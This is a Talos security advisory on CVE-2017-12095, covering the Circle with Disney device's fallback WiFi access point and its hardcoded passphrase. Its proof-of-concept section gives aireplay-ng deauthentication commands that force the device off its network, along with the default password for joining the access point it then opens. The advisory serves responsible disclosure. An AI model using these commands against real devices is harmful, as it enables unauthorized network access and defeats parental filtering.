# Talos Vulnerability Report

### TALOS-2017-0447

## Circle with Disney WiFi Insecure Access Point Vulnerability

##### April 4, 2018

##### CVE Number

CVE-2017-12095

### Summary

An exploitable vulnerability exists in the WiFi Access Point feature of Circle with Disney running firmware 2.0.1. A series of WiFi packets can force Circle to setup an Access Point with default credentials. An attacker needs to send a series of spoofed “de-auth” packets to trigger this vulnerability.

### Tested Versions

Circle with Disney 2.0.1

### Product URLs

<https://meetcircle.com/>

### CVSSv3 Score

6.5 - CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CWE

CWE-284: Improper Access Control

### Details

Circle with Disney is a network device used to monitor internet use of children on a given network.

Circle can connect to a home network either via WiFi or wired connection.
When no cable connection is possible, Circle will switch to WiFi, which was set-up during the initial configuration.

When connected via WiFi, the `main` function in the `configd` binary continuously checks for network connectivity by calling `sub_40A55C`.
This function verifies that the interface is associated with the Access Point and that it has an IP address assigned. If any of these checks aren’t satisfied, the return value will be 0, meaning there’s no available connection.

Back in the `main` function, when there’s no connection, function `sub_40A2A0` will be called with argument “Internet connection down”. At high level, the function works as follows:

```
def circle_ap(status):
    print "setting Wifi Status to %s" % status
    if status == "paired":
        system("circle_ap.sh down 30 &")
    else
        system("circle_ap.sh up &")                # [1]

```

At [1] the `circle_ap.sh` script is called to start an Access Point.
Contents of the script are the following:

```
#!/bin/sh

CIRCLE_ROOT=`cat /tmp/CIRCLE_ROOT`
case $# in
  2)
        sleep $2
        ;;
esac

case "$1" in
  up)
        ps | grep [h]ostapd && ifconfig ra0 | grep UP &&  exit 0
        killall hostapd;
        ifconfig eth0 0.0.0.0
        ifconfig ra0 10.123.234.1 netmask 255.255.255.0 up
        hostapd -B /tmp/hostapd.conf                              # [2]
        $CIRCLE_ROOT/scripts/refresh_hosts.sh ap
        ;;
  down)
        killall hostapd;
        ifconfig ra0 10.123.234.1 netmask 255.255.255.0 down;
        ;;
  *)
        echo -n "usage: circle_ap <up/down> <optional delay>"
        exit 1
esac

exit 0

```

At [2] `hostapd` is used to bring up an Access Point using the configuration below.

```
# grep -e ssid -e wpa /tmp/hostapd.conf
ssid=Circle-1234
wpa=3
wpa_passphrase=mycircle
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_group_rekey=600

```

The SSID used is “Circle-“ prefixed with the last two hex digits of the MAC address.
The “wpa\_passphrase” parameter is fixed.

Indeed, the base `hostapd.conf` file is copied from `/mnt/shares/usr/bin/scripts/hostapd.conf` during boot time by the script `startcircle`. The only modification applied is the SSID name.

This feature allows an attacker to connect to a Circle Access Point, after forcing it out of its legitimate WiFi network.
The device will continue to function but won’t be able to apply any filtering over the original network, moreover this allows an attacker to conduct further attacks against the device that may be possible only on a common subnetwork.

As an example, this vulnerability would allow an external attacker to apply TALOS-2017-0396 and TALOS-2017-0371 to completely compromise the device.

### Exploit Proof-of-Concept

The following proof of concept shows how to make the device disconnect from its legitimate WiFi network and to start its own Access Point, by sending a series of “deauth” packets.

```
$ airmon-ng start wlan0 1
$ aireplay-ng --deauth 10000 -a $WIFI_ROUTER_MAC -c $CIRCLE_MAC mon0

```

After a new Access Point is detected with name starting with “Circle-“ it’s possible to connect to it using the password “mycircle”.
